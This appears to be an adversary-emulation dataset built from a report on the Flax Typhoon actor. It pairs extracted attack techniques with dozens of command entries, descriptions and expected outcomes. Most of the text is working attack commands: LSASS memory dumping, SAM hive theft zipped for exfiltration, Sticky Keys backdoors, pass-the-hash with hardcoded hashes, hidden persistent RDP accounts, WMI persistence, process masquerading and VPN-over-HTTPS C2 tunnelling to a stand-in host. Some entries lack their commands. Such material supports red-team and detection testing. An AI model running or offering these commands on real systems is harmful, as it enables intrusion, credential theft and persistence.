extracted_ttps.description: Flax Typhoon establishes a long-term method of accessing the compromised system using the remote desktop protocol (RDP)
The actor uses SoftEther's VPN-over-HTTPS operation mode to encapsulate Ethernet packets into compliant HTTPS packets and transmit them to TCP port 443
Attacker uses WMI commands for execution, as indicated by the mention of blocking process creations originating from WMI commands
Attacker potentially uses PowerShell for execution, as it is mentioned as a mitigation method to block or audit observed activity

Flax Typhoon targets the Local Security Authority Subsystem Service (LSASS) process memory and Security Account Manager (SAM) registry hive to dump hashed passwords for users signed into the local system
Flax Typhoon uses protocol tunneling to communicate with its command and control servers
The actor renames the executable file to imitate legitimate Windows components, indicating an attempt to masquerade as a legitimate process
The actor uses legitimate software and renames the executable file to imitate legitimate Windows components, indicating an attempt to access credentials
The attacker uses Windows Management Instrumentation (WMI) to gather information about the target system
The use of PSExec for lateral movement is implied as it is mentioned in the context of blocking process creations originating from PSExec
Flax Typhoon downloads and runs a piece of malware that exploits one or more known vulnerabilities to obtain local system privileges
Flax Typhoon accesses the compromised system via RDP
Flax Typhoon uses the resulting password hashes for pass-the-hash (PtH) attacks to access other resources on the compromised network
Flax Typhoon may use WMI to gather information about the network
The attacker uses valid accounts and living-off-the-land binaries (LOLBins) to achieve and maintain unauthorized access to target networks
Flax Typhoon uses legitimate software to access Taiwanese organizations and utilizes Sticky Keys to launch Task Manager with local system privileges
The mention of blocking credential stealing from the Windows local security authority subsystem (lsass.exe) implies an attempt at OS credential dumping
Flax Typhoon achieves initial access by exploiting known vulnerabilities in public-facing servers
Flax Typhoon replaces the Sticky Keys binary to establish a long-term method of accessing the compromised system
Flax Typhoon can create memory dumps after accessing Task Manager with local system privileges
The attacker uses remote services, such as PSExec, to move laterally within the target network
Flax Typhoon uses PowerShell and WMIC to execute commands on the compromised system
Flax Typhoon uses legitimate software to quietly access Taiwanese organizations, exploiting public-facing applications
Detected Remote Desktop Protocol activity via NLP pattern matching
Flax Typhoon installs a legitimate VPN bridge to automatically connect to actor-controlled network infrastructure
Detected PowerShell activity via NLP pattern matching
Although not directly mentioned, the discussion around mitigating risk from access methods implies potential initial access techniques like phishing
Flax Typhoon uses legitimate software to access Taiwanese organizations, potentially through user interaction
Flax Typhoon uses command and scripting interpreters, such as PowerShell, to execute commands
The attacker uses compromised systems to gather information about the target network
Flax Typhoon uses LSASS and SAM dumping to access credentials
Detected Windows Management Instrumentation activity via NLP pattern matching
The attacker uses PowerShell to execute commands on the target system
Flax Typhoon enumerates restore points used by System Restore
Flax Typhoon exploits server software vulnerabilities to gain access to Taiwanese organizations
Flax Typhoon may use tools like Mimikatz to obtain credentials
Use of PowerShell and other command-line tools for malicious activities
Flax Typhoon alters operating system configurations, potentially to evade detection
Flax Typhoon dumps local credentials to gain access to sensitive information
Flax Typhoon dumps remote credentials to gain access to sensitive information

attacks.command: reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f && netsh advfirewall firewall add rule name=\"RDP\" dir=in action=allow protocol=TCP localport=3389
attacks.description: Enable Remote Desktop and allow inbound RDP traffic through Windows Firewall.
attacks.expected_behavior: The RDP service is enabled (fDenyTSConnections set to 0) and a firewall rule named 'RDP' is created to permit TCP traffic on port 3389.

attacks.command: net user rdppersist /add /expires:never && net localgroup "Remote Desktop Users" rdppersist /add && netsh advfirewall firewall add rule name=\"RDP_User\" dir=in action=allow protocol=TCP localport=3389
attacks.description: Create a persistent local user for RDP access and ensure firewall rule for the user exists.
attacks.expected_behavior: A new local account 'rdppersist' is created, added to the Remote Desktop Users group, and a firewall rule allowing RDP traffic is added.

attacks.command: schtasks /Create /SC ONSTART /TN "EnableRDP" /TR "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f" /RL HIGHEST /F
attacks.description: Create a scheduled task that re‑enables RDP at every system boot to maintain persistence.
attacks.expected_behavior: A scheduled task named 'EnableRDP' is registered; it runs at system start with highest privileges and sets fDenyTSConnections to 0, ensuring RDP remains enabled.

attacks.command: sudo apt-get update && sudo apt-get install -y xrdp
attacks.description: Installs the xrdp service to enable Remote Desktop Protocol access on Linux
attacks.expected_behavior: Updates package list and installs xrdp daemon, enabling RDP connectivity on the system

attacks.command: sudo systemctl enable xrdp && sudo systemctl start xrdp
attacks.description: Enables and starts the xrdp service for persistent remote desktop access
attacks.expected_behavior: Configures xrdp to start at boot and initiates the service immediately

attacks.command: sudo sed -i 's/address=127.0.0.1/address=0.0.0.0/g' /etc/xrdp/xrdp.ini && sudo systemctl restart xrdp
attacks.description: Modifies xrdp configuration to listen on all interfaces and restarts the service
attacks.expected_behavior: Changes xrdp binding to accept remote connections from any IP and restarts the service to apply changes

attacks.description: Download and silently install SoftEther VPN client
attacks.expected_behavior: Downloads VPN client installer to TEMP directory and executes silent installation. Establishes base for tunneling operations.

attacks.description: Connect to VPN server using HTTPS tunneling
attacks.expected_behavior: Establishes VPN-over-HTTPS connection to specified server, encapsulating traffic in HTTPS packets on port 443.

attacks.command: vpncmd localhost /CLIENT /CMD AccountCreate Tunnel /SERVER:example.com:443 /HUB:VPNHub /USER:test /PASSWORD:test123 && vpncmd localhost /CLIENT /CMD AccountConnect Tunnel
attacks.description: Create VPN account and connect via HTTPS tunneling
attacks.expected_behavior: Creates persistent VPN account configuration and initiates connection, maintaining HTTPS-encapsulated C2 channel.

attacks.description: Basic command to connect to a predefined SoftEther VPN account using vpncmd, initiating HTTPS tunneling over port 443.
attacks.expected_behavior: Connects to the configured SoftEther VPN server using stored settings, establishing a tunnel over HTTPS on port 443. Runs in foreground.

attacks.description: Start SoftEther's vpnclient daemon in the background to enable persistent tunneling operations.
attacks.expected_behavior: Launches the SoftEther client as a background service, allowing persistent tunnel connections without user interaction. May require root for network interface creation.

attacks.command: vpncmd localhost:5555 /CLIENT /CMD AccountStartupSet myvpn && vpncmd localhost:5555 /CLIENT /CMD AccountAutoConnectSet myvpn /ENABLE
attacks.description: Configures a SoftEther account to auto-connect on client startup, enabling persistent C2 tunneling over HTTPS.
attacks.expected_behavior: Sets the specified VPN account to start automatically when the SoftEther client starts, ensuring the tunnel reconnects after restarts. Facilitates resilient command and control.

attacks.description: Basic WMI process creation using wmic.exe
attacks.expected_behavior: Starts Notepad.exe via WMI process creation

attacks.description: Intermediate WMI execution via PowerShell
attacks.expected_behavior: Launches Calculator.exe using WMI method invocation

attacks.command: powershell -Command "$f=Set-WmiInstance -Class __EventFilter -Namespace 'root\cimv2' -Arguments @{Name='TestFilter'; EventNamespace='root\cimv2'; QueryLanguage='WQL'; Query=\"SELECT * FROM __IntervalTimerEvent WHERE TimerID='WMI_Test'\"}; $c=Set-WmiInstance -Class CommandLineEventConsumer -Arguments @{Name='TestConsumer'; CommandLineTemplate='ping 127.0.0.1 -n 3'}; Set-WmiInstance -Class __FilterToConsumerBinding -Arguments @{Filter=$f; Consumer=$c};"
attacks.description: Advanced WMI event subscription for scheduled execution
attacks.expected_behavior: Creates WMI event subscription that triggers ping command every second via interval timer

attacks.description: Basic WMI/CIM process creation to create a test file
attacks.expected_behavior: Attempts to create a process via CIM/WMI methods, creating /tmp/wmi_test file if successful

attacks.description: Intermediate encoded command invoking CIM process creation
attacks.expected_behavior: Executes Base64-encoded PowerShell to create a process via CIM methods (echoes 'wmi_test')

attacks.command: powershell -Command "try { $process = Invoke-CimMethod -Namespace 'root/cimv2' -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='/bin/sleep 5'} } finally { Remove-Item -Path /tmp/wmi_temp -ErrorAction SilentlyContinue }"
attacks.description: Advanced CIM execution with error handling and cleanup
attacks.expected_behavior: Creates a sleep process via CIM and attempts temp file cleanup, testing command chaining and error suppression

attacks.description: Writes a test file to TEMP directory using PowerShell.
attacks.expected_behavior: Creates a file named test.txt in the user's TEMP directory containing 'test content'.

attacks.description: Executes a base64-encoded PowerShell command to print a test message.
attacks.expected_behavior: Prints 'Test execution' to the console via decoded PowerShell command.

attacks.description: Obfuscates Get-Process command using string concatenation and Invoke-Expression.
attacks.expected_behavior: Lists first 3 running processes via deobfuscated Get-Process command.

attacks.description: Writes a simple text file to the temporary directory using PowerShell's Set-Content cmdlet.
attacks.expected_behavior: A file named hello.txt containing the string "Hello from PowerShell" is created in the system's temporary directory.

attacks.description: Executes a Base64‑encoded PowerShell command (decoded to Get-Date) to retrieve the current system date and time.
attacks.expected_behavior: The command outputs the current date and time to the console, demonstrating execution of an encoded PowerShell payload without performing any harmful actions.

attacks.description: Basic credential dump: reads the shadow file containing password hashes.
attacks.expected_behavior: Outputs the contents of /etc/shadow to a file in the user's home directory.

attacks.description: Intermediate dump: creates a core dump of the sshd process and extracts possible password hash strings.
attacks.expected_behavior: Generates a core file for sshd, runs strings to pull 32‑character hex strings (common hash length) and saves them.

attacks.command: sudo dd if=/dev/mem bs=1M count=10 skip=$((0x7fffd000)) of=/tmp/mem_dump.bin && strings /tmp/mem_dump.bin | grep -E '^[a-f0-9]{64}$' > $HOME/mem_hashes.txt
attacks.description: Advanced: reads a raw memory region via /dev/mem and extracts SHA‑512 hash candidates.
attacks.expected_behavior: Creates a binary dump of a memory segment, searches for 64‑character hex strings, and stores them.

attacks.description: Copies notepad.exe to TEMP directory as svchost.exe
attacks.expected_behavior: Creates svchost.exe in TEMP folder, mimicking the legitimate Windows process name

attacks.description: Creates and executes fake msdtc.exe containing benign PowerShell code
attacks.expected_behavior: Generates executable named msdtc.exe in TEMP and executes it, mimicking Microsoft Distributed Transaction Coordinator service

attacks.command: cmd.exe /c copy /Y "%windir%\System32\notepad.exe" "%TEMP%\lsass.exe" && sc.exe create TestService binPath= "%TEMP%\lsass.exe" && sc.exe start TestService
attacks.description: Creates service running renamed notepad.exe as lsass.exe
attacks.expected_behavior: Creates service pointing to TEMP\lsass.exe (masquerading as LSA subsystem) and starts it. Requires admin for service creation.

attacks.description: Basic masquerading: copy a test script to /tmp and rename it to a Windows executable name (svchost.exe) and make it executable.
attacks.expected_behavior: A file named svchost.exe appears in /tmp; executing it runs the original malicious.sh content, demonstrating the disguise.

attacks.description: Intermediate masquerading: create a symbolic link named explorer.exe in a system binary directory that points to a malicious binary.
attacks.expected_behavior: A symlink explorer.exe appears in /usr/local/bin; invoking explorer.exe executes the malicious binary, hiding its true location.

attacks.description: Advanced masquerading: copy a malicious binary to a system directory, rename it to a common Windows DLL name (kernel32.dll), and set the setuid bit to run with elevated privileges.
attacks.expected_behavior: The file kernel32.dll in /usr/local/sbin runs the malicious binary with root privileges when executed, appearing as a legitimate Windows system library.

attacks.description: Copies the legitimate reg.exe to a temporary file named svchost.exe (imitating a Windows service) and uses it to dump the SAM hive containing password hashes.
attacks.expected_behavior: A file sam.save is created in the %TEMP% directory containing the raw SAM hive data. The command succeeds only when run with administrative rights.

attacks.description: Copies reg.exe to a temporary file named services.exe, dumps the SYSTEM hive (required for decrypting SAM hashes), then deletes the renamed binary to reduce forensic footprint.
attacks.expected_behavior: Creates system.save in %TEMP% with the SYSTEM hive data and removes the fake services.exe file. Administrative privileges are required for the hive export.

attacks.command: powershell -Command "$src = \"$env:windir\system32\reg.exe\"; $dst = \"$env:TEMP\lsass.exe\"; Copy-Item -Path $src -Destination $dst -Force; & $dst save HKLM\\SAM \"$env:TEMP\sam.save\"; & $dst save HKLM\\SYSTEM \"$env:TEMP\system.save\"; Compress-Archive -Path \"$env:TEMP\sam.save\",\"$env:TEMP\system.save\" -DestinationPath \"$env:TEMP\cred_dump.zip\" -Force"
attacks.description: PowerShell workflow that copies reg.exe to a file named lsass.exe, extracts both SAM and SYSTEM hives, and compresses them into a zip archive for easier exfiltration.
attacks.expected_behavior: Generates sam.save and system.save in %TEMP%, then creates cred_dump.zip containing both files. The process requires admin rights; the zip file can be inspected to verify successful collection.

attacks.description: Copies the legitimate 'strings' binary to a Windows‑style name and uses it to read the /etc/shadow file, dumping potential password hashes.
attacks.expected_behavior: Creates /tmp/lsass.exe, reads /etc/shadow, and writes the output to /tmp/shadow_dump.txt. Requires root privileges to read /etc/shadow.

attacks.description: Renames the 'gcore' utility to mimic a Windows LSASS executable, creates a core dump of the sshd process, and extracts printable strings that may contain credential material.
attacks.expected_behavior: Generates a core dump file (e.g., /tmp/sshd_core.<pid>) and extracts strings to /tmp/sshd_core_strings.txt. Requires root to attach to the sshd process.

attacks.command: sc.exe create BadService binPath= "cmd.exe /c echo Exploit > C:\Windows\Temp\test.txt" start= auto && sc.exe start BadService
attacks.description: Creates and starts a service running as SYSTEM to write a test file
attacks.expected_behavior: Creates C:\Windows\Temp\test.txt with SYSTEM privileges via service execution

attacks.command: schtasks /create /tn "PrivEscTask" /tr "cmd.exe /c echo Exploit > C:\Windows\Temp\task.txt" /sc ONCE /st 00:00 /ru SYSTEM /f && schtasks /run /tn "PrivEscTask"
attacks.description: Creates and immediately runs a scheduled task as SYSTEM
attacks.expected_behavior: Runs cmd.exe as SYSTEM to create C:\Windows\Temp\task.txt via scheduled task

attacks.command: powershell -Command "Copy-Item $env:TEMP\benign.dll C:\Windows\System32\vuln.dll -Force -ErrorAction SilentlyContinue; sc.exe stop VulnerableService -ErrorAction SilentlyContinue; sc.exe start VulnerableService"
attacks.description: Simulates DLL hijacking by replacing vulnerable service's DLL (requires manual cleanup)
attacks.expected_behavior: Attempts to overwrite system DLL and restart service - fails safely but demonstrates technique

attacks.description: Attempts to exploit the Polkit CVE‑2021‑4034 vulnerability by invoking pkexec to spawn a root shell.
attacks.expected_behavior: If the system is vulnerable, pkexec will launch /bin/bash with root privileges, providing a root shell to the attacker.

attacks.description: Downloads a placeholder Polkit exploit script to /tmp, makes it executable, and runs it to attempt privilege escalation.
attacks.expected_behavior: The script, when executed, will try to exploit a known local vulnerability (e.g., Polkit) and, on a vulnerable system, elevate the current user to root.

attacks.description: Sets LD_PRELOAD to a malicious shared object and invokes sudo, attempting to bypass sudo's security checks and execute a root‑owned command.
attacks.expected_behavior: If sudo is vulnerable to LD_PRELOAD manipulation, the malicious library will be loaded, causing the command to run with root privileges and display the effective user ID.

attacks.description: Launches the native Remote Desktop client to connect to the target host at 192.168.1.10.
attacks.expected_behavior: The RDP client opens and attempts to authenticate to the specified IP address using the current user's credentials.

attacks.command: reg add "\\\\192.168.1.10\\HKLM\\System\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f && mstsc.exe /v:192.168.1.10
attacks.description: Enables Remote Desktop on the remote machine by setting the fDenyTSConnections registry value to 0, then initiates an RDP session.
attacks.expected_behavior: The registry change permits RDP connections on the remote host; subsequently, mstsc attempts to connect to the host.

attacks.command: powershell -Command "Invoke-Command -ComputerName 192.168.1.10 -ScriptBlock { Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server' -Name 'fDenyTSConnections' -Value 0; Enable-NetFirewallRule -DisplayGroup 'Remote Desktop' } ; mstsc.exe /v:192.168.1.10"
attacks.description: Uses PowerShell remoting to enable RDP and open the firewall on the remote host, then launches the RDP client to connect.
attacks.expected_behavior: PowerShell remoting configures the remote system to allow RDP traffic and opens the firewall rule; afterwards, mstsc connects to the remote host.

attacks.description: Basic RDP connection to target IP with test credentials, ignoring certificate validation
attacks.expected_behavior: Initiates RDP connection to 10.0.0.1 using provided credentials. Connection success depends on target configuration.

attacks.description: Intermediate RDP connection using NLA security with dynamic resolution and compression
attacks.expected_behavior: Connects via RDP with enhanced security (NLA) and performance optimizations. May bypass basic detection mechanisms.

attacks.description: Advanced RDP connection with drive redirection and clipboard sharing over TLS
attacks.expected_behavior: Establishes RDP session with file share mapping (/home/user/shared) and clipboard passthrough using TLS encryption, enabling data exfiltration capabilities.

attacks.description: Simulates reuse of credentials across systems, mimicking post-PtH lateral movement using built-in net.exe.
attacks.expected_behavior: Establishes authenticated connection to local and remote administrative shares using plaintext credentials, simulating credential reuse after hash capture.

attacks.command: cmd.exe /c "echo wmic /node:\\target-pc process call create \"cmd.exe /c echo lateral_move_via_wmi > %TEMP%\\wmi_exec.txt\" | runas /user:DOMAIN\\user1 \"cmd /k\""
attacks.description: Simulates lateral movement using WMI and alternate credentials, often used after obtaining hashes that are converted to plaintext or used via pass-the-ticket.
attacks.expected_behavior: Executes WMI command on remote host using runas with alternate domain user, simulating post-PtH execution.

attacks.command: powershell -Command "try { $Command = 'cmd /c net use \\target-pc\C$ /user:attacker$ testPass123 && dir \\target-pc\C$'; $Encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($Command)); Start-Process powershell.exe -ArgumentList '-EncodedCommand', $Encoded -WindowStyle Hidden } catch { exit 1 }"
attacks.description: Executes a hidden encoded command to simulate remote access using alternate credentials, modeling advanced obfuscation used after hash theft.
attacks.expected_behavior: Spawns a hidden PowerShell process that decodes and runs a command to access a remote system with hardcoded credentials, simulating stealthy lateral movement.

attacks.description: Simulate caching of NTLM password hash in a hidden file with restricted permissions
attacks.expected_behavior: Creates a hidden file in /tmp containing a test NTLM hash. File is only readable by the user. No actual authentication occurs.

attacks.command: if [ -f /opt/tools/impacket-psexec ]; then /opt/tools/impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:ed8f48d9e32f85c7849808ba1fb6454f user@192.168.1.100 'id'; else echo 'Tool not available'; fi
attacks.description: Execute pass-the-hash attack using locally available impacket-psexec binary with stolen hash
attacks.expected_behavior: If the impacket-psexec tool exists, it attempts to authenticate to the remote host using the provided NTLM hash and runs the 'id' command. Otherwise, outputs a message indicating tool absence.

attacks.command: export PTH_SMB_HASH='aad3b435b51404eeaad3b435b51404ee:ed8f48d9e32f85c7849808ba1fb6454f'; export PTH_USER='victim'; echo "Using hash for $PTH_USER to access SMB share"; /usr/bin/smbclient //192.168.1.100/C$ -U $PTH_USER --pw-nt-hash $PTH_SMB_HASH -c 'ls' 2>/dev/null || echo 'Access failed or smbclient not available'
attacks.description: Use environment variables to store and pass NT hash to smbclient for accessing a remote SMB share
attacks.expected_behavior: Sets environment variables for user and hash, then attempts to list contents of remote C$ share using smbclient with NT hash authentication. If smbclient is not available or access fails, outputs error.

attacks.description: Basic user execution: create and run a simple shell script in temp directory
attacks.expected_behavior: Creates a small script in /tmp, makes it executable, and runs it. Outputs 'User execution test' to stdout.

attacks.description: Intermediate: download and execute a script directly from a remote server via pipe
attacks.expected_behavior: Attempts to download a script from a remote host and executes it in memory via shell. Fails silently if network is unreachable or server does not exist.

attacks.description: Advanced: execute a base64-encoded command stream to obfuscate intent
attacks.expected_behavior: Decodes a base64 string containing benign echo commands and executes them via shell. Simulates obfuscated payload execution without malicious content.

attacks.command: reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /d "taskmgr.exe" /f
attacks.description: Modifies registry to launch Task Manager when sethc.exe is triggered
attacks.expected_behavior: Pressing SHIFT five times launches Task Manager with SYSTEM privileges.

attacks.command: takeown /f %SystemRoot%\System32\sethc.exe && icacls %SystemRoot%\System32\sethc.exe /grant Administrators:F /T && ren %SystemRoot%\System32\sethc.exe sethc.bak && copy %SystemRoot%\System32\cmd.exe %SystemRoot%\System32\sethc.exe
attacks.description: Replaces sethc.exe with cmd.exe to gain SYSTEM shell on Sticky Keys trigger
attacks.expected_behavior: Triggering Sticky Keys opens a SYSTEM command prompt, allowing manual launch of Task Manager.

attacks.command: schtasks /create /tn "SystemUpdate" /tr "taskmgr.exe" /sc ONCE /st 00:00 /ru SYSTEM /f && reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /d "schtasks.exe /run /tn \"SystemUpdate\"" /f
attacks.description: Creates a SYSTEM-level scheduled task for Task Manager and sets sethc.exe to trigger it
attacks.expected_behavior: Sticky Keys trigger executes the scheduled task, launching Task Manager as SYSTEM.

attacks.description: Uses mshta.exe to execute a JavaScript payload that launches the Calculator application, demonstrating client‑side code execution without requiring admin privileges.
attacks.expected_behavior: Calculator (calc.exe) opens on the victim machine.

attacks.description: Invokes rundll32.exe with the javascript protocol to run a script that starts Notepad, showcasing an alternative native binary for client execution.
attacks.expected_behavior: Notepad (notepad.exe) opens on the victim machine.

attacks.description: Writes a base64‑encoded batch file (containing the command 'calc') to the temp directory, decodes it with certutil, and executes the resulting .bat file, emulating a multi‑step client‑side exploit chain.
attacks.expected_behavior: Calculator (calc.exe) opens after the batch file is executed.

attacks.description: Downloads a malicious shell script from a remote server and pipes it directly to bash, simulating exploitation of a vulnerable web service that serves executable payloads.
attacks.expected_behavior: The script is fetched and executed; in a test environment it could simply echo a message indicating successful execution.

attacks.description: Sends a crafted HTTP request to a vulnerable CGI endpoint that executes arbitrary commands (here 'uname -a') and returns the output, demonstrating client execution via remote code execution.
attacks.expected_behavior: The target server runs the supplied command and returns system information back to the client.

attacks.description: Downloads a malicious ELF binary to /tmp, makes it executable, and runs it, representing exploitation of a vulnerability that allows arbitrary file download and execution on the client.
attacks.expected_behavior: The binary is executed; in a controlled test it could simply print a confirmation message.

attacks.description: Basic abuse of sudo to proxy execution of a shell command that writes a test file
attacks.expected_behavior: Creates /tmp/sudo_test.txt with content 'test' if current user has sudo privileges for /bin/sh

attacks.description: Intermediate: Abuse pkexec (a Polkit helper) to proxy execution via D-Bus authentication mechanism
attacks.expected_behavior: If pkexec prompts and user authenticates, a shell runs and creates /tmp/dbus_test.txt with content 'test'

attacks.description: Advanced: Abuse find's -exec functionality (a signed binary) to proxy shell command execution
attacks.expected_behavior: Runs the command in -exec for each file matching 'test' in /tmp; creates /tmp/find_test.txt with content 'pwn' if any match is found or always if logic is forced (safe variant only attempts)

attacks.command: wmic process call create "cmd.exe /c echo PowerShellTest > %TEMP%\wmic_test.txt"
attacks.description: Uses WMIC to spawn a cmd.exe process that writes a test string to a file in the temporary directory.
attacks.expected_behavior: A file named wmic_test.txt containing 'PowerShellTest' is created in %TEMP%. No admin rights are required.

attacks.description: Executes a PowerShell command that writes a benign string to a file using Set-Content.
attacks.expected_behavior: Creates ps_test.txt in the user's temporary folder containing the specified test string. No elevated privileges are needed.

attacks.description: Runs an encoded PowerShell command that executes 'whoami' to display the current user context.
attacks.expected_behavior: Outputs the username of the account running the command to the console. No admin rights are required.

attacks.description: Query active RDP sessions on a remote host
attacks.expected_behavior: Lists active Remote Desktop sessions on the specified host. No connection is initiated.

attacks.command: reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f && sc start TermService
attacks.description: Enable RDP via registry and start Terminal Service
attacks.expected_behavior: Modifies registry to allow RDP connections and starts the Terminal Service. Host becomes accessible via RDP.

attacks.description: Store credentials and initiate RDP connection
attacks.expected_behavior: Stores credentials in Windows Credential Manager and launches RDP client to connect to the target IP. Connection success depends on target configuration.

attacks.description: Basic RDP connection using the legacy rdesktop client with explicit credentials.
attacks.expected_behavior: Attempts to open an RDP session to 10.0.0.5 using the provided username and password; a graphical window may appear if a display is available.

attacks.description: Intermediate RDP connection using xfreerdp with clipboard sharing and a local drive redirection.
attacks.expected_behavior: Establishes an RDP session to 10.0.0.5, enabling clipboard sync and exposing the user's home directory as a shared drive within the remote session.

attacks.description: Advanced RDP access via an SSH tunnel that forwards the remote Windows host's RDP port to localhost, then connects with xfreerdp.
attacks.expected_behavior: Creates a background SSH tunnel forwarding port 3389 from the target Windows host through a jumpbox, waits briefly, then initiates an RDP session to the tunneled localhost endpoint, ignoring certificate warnings.

attacks.command: sc.exe create VPNService binPath= "C:\Windows\System32\vpndummy.exe" start= auto
attacks.description: Creates a service to launch VPN client (dummy executable)
attacks.expected_behavior: Service creation with auto-start, though execution fails due to missing executable

attacks.description: Configures a VPN connection using PowerShell
attacks.expected_behavior: Creates VPN network interface configuration pointing to test server

attacks.command: cmd.exe /c "echo rasdial TestVPN user123 > %TEMP%\vpn_connect.bat && schtasks /Create /TN "VPN Startup" /TR "%TEMP%\vpn_connect.bat" /SC ONLOGON /RU SYSTEM /F"
attacks.description: Creates logon-triggered VPN connection script via scheduled task
attacks.expected_behavior: Schedules batch file execution on user logon to initiate VPN connection (credentials omitted for safety)

attacks.command: sudo apt-get install openvpn -y && wget https://example.com/config.ovpn -O /tmp/client.conf && sudo openvpn --config /tmp/client.conf
attacks.description: Install OpenVPN and connect using downloaded configuration
attacks.expected_behavior: Installs OpenVPN package, downloads test config from example.com, establishes VPN connection using the configuration

attacks.command: encoded_config='base64encodedstring' && echo $encoded_config | base64 -d | sudo tee /etc/openvpn/client/stealth.ovpn >/dev/null && sudo openvpn --config /etc/openvpn/client/stealth.ovpn --daemon
attacks.description: Advanced deployment with base64-encoded configuration
attacks.expected_behavior: Decodes embedded VPN configuration and establishes background VPN connection without downloading external files

attacks.description: Executes a simple PowerShell command to enumerate the first five running processes.
attacks.expected_behavior: Outputs a short list of process names and IDs to the console.

attacks.description: Writes a base64‑encoded string to a temporary file, decodes it with the legacy certutil utility, then removes the temporary file.
attacks.expected_behavior: Creates a temporary file, decodes it to produce a plain‑text file (containing "Hello world"), and cleans up the temporary files without error.

attacks.description: Creates a scheduled task that runs a hidden PowerShell command at user logon, demonstrating advanced use of PowerShell for persistence.
attacks.expected_behavior: Registers a task named 'AdvTest' that will execute a benign Write-Host command in a hidden window each time a user logs on.

attacks.description: Invokes PowerShell to output a test string, confirming PowerShell execution capability on Linux.
attacks.expected_behavior: The command prints 'PowerShell test on Linux' to the console and exits.

attacks.description: Creates a temporary PowerShell script that lists the first five processes, executes it, and then removes the script file.
attacks.expected_behavior: A short list of running processes is displayed, after which the temporary script file is deleted.

attacks.description: Copies the local /etc/hosts file using Invoke-WebRequest, archives the copy with Compress-Archive, and cleans up the intermediate file.
attacks.expected_behavior: A file named hosts_copy is created in the user's home directory, then compressed into hosts_archive.zip, and finally hosts_copy is removed.

attacks.description: Creates a .lnk shortcut in %TEMP% that, when opened, runs a harmless echo command, emulating a malicious attachment delivered via phishing.
attacks.expected_behavior: A shortcut file named UpdateReminder.lnk is created; executing the shortcut writes 'PhishingDemo' to phish_output.txt in the temp directory.

attacks.command: powershell -Command "$msg = 'Please review the attached document.'; $attach = \"$env:TEMP\\phish.docx\"; Set-Content -Path $attach -Value 'Test document content' -Encoding ASCII; Send-MailMessage -From 'security@company.com' -To 'user@company.com' -Subject 'Important Update' -Body $msg -Attachments $attach -SmtpServer 'smtp.example.local' -ErrorAction SilentlyContinue"
attacks.description: Composes and sends a phishing email with a fake .docx attachment using PowerShell's Send‑MailMessage, representing a typical credential‑harvesting lure.
attacks.expected_behavior: An email is sent to the target address with the subject 'Important Update' and a harmless .docx file attached; the command runs without requiring admin rights.

attacks.description: Writes a base64‑encoded string to a temporary file and decodes it with certutil, mimicking the extraction of a malicious document from a phishing attachment.
attacks.expected_behavior: A file named malicious.doc is created in %TEMP% containing the decoded data; no execution occurs, keeping the operation safe.

attacks.description: Download a malicious shell script disguised as a document and execute it
attacks.expected_behavior: Silently downloads a script from a remote server, makes it executable, and runs it in the user context. Simulates execution of a malicious attachment.

attacks.description: Create and execute a fake invoice script in temp directory
attacks.expected_behavior: Creates a benign script in the temp directory simulating a phishing attachment, then executes it using bash. Leaves minimal trace and is self-contained.

attacks.description: Open a malicious URL in the default browser to simulate phishing link click
attacks.expected_behavior: Opens a fake login page in the user's default browser, simulating a phishing email link click. Runs asynchronously.

attacks.description: Collects detailed OS, hardware, and hotfix information from the local system.
attacks.expected_behavior: Displays system information on the console, such as OS version, installed updates, memory, and processor details.

attacks.description: Copies the local hosts file to the temporary directory for later analysis.
attacks.expected_behavior: Creates a file named hosts_copy.txt in %TEMP% containing the exact contents of the system's hosts file.

attacks.description: Exports the HKLM Run registry key (auto‑start entries) to a .reg file in the temporary directory.
attacks.expected_behavior: Creates run_keys.reg in %TEMP% containing all values under the Run key, which can be opened with RegEdit to view persistence configuration.

attacks.description: List local user accounts
attacks.expected_behavior: Displays system user account information including usernames, UIDs, and home directories.

attacks.description: Show network interfaces and listening ports
attacks.expected_behavior: Displays network interface configurations and all TCP/UDP ports in listening state.

attacks.description: Collect all configuration files from /etc directory
attacks.expected_behavior: Aggregates contents of all .conf/.cfg files under /etc into /tmp/configs.txt. Requires root to access protected files.

attacks.command: reg save HKLM\SAM %TEMP%\sam.dump && reg save HKLM\SYSTEM %TEMP%\system.dump
attacks.description: Exports the SAM and SYSTEM registry hives to temporary files using the built‑in reg.exe tool.
attacks.expected_behavior: Two files (sam.dump and system.dump) are created in the %TEMP% directory containing the raw registry hives; no visible output is produced.

attacks.command: for /f "tokens=2" %a in ('tasklist /FI "IMAGENAME eq lsass.exe" /NH') do rundll32.exe comsvcs.dll,MiniDump %a %TEMP%\lsass.dump
attacks.description: Finds the LSASS process ID and creates a memory dump of LSASS using rundll32.exe's MiniDump function.
attacks.expected_behavior: A file named lsass.dump is written to %TEMP% containing a snapshot of LSASS memory; the command itself produces no console output.

attacks.description: Uses PowerShell to obtain LSASS PID, dumps its memory with rundll32, then compresses the dump into a zip archive.
attacks.expected_behavior: Creates a LSASS memory dump file (lsass_<PID>.dmp) in %TEMP% and then compresses it to lsass_<PID>.zip; the original dump remains unless manually removed.

attacks.description: Dump system password hashes from /etc/shadow
attacks.expected_behavior: Creates /tmp/shadow.dump containing encrypted user passwords from privileged shadow file

attacks.description: Combine password files for offline cracking
attacks.expected_behavior: Generates /tmp/unshadowed.txt with combined credential data using John the Ripper's unshadow utility

attacks.description: Create SSH daemon memory dump for credential extraction
attacks.expected_behavior: Generates core dump of sshd process in /tmp for later credential scanning via memory analysis

attacks.command: sc.exe create VulnSvc binPath= "C:\\Windows\\System32\\notepad.exe" start= demand
attacks.description: Creates a new service named VulnSvc that runs notepad.exe, simulating exploitation of a service creation vulnerability in server software.
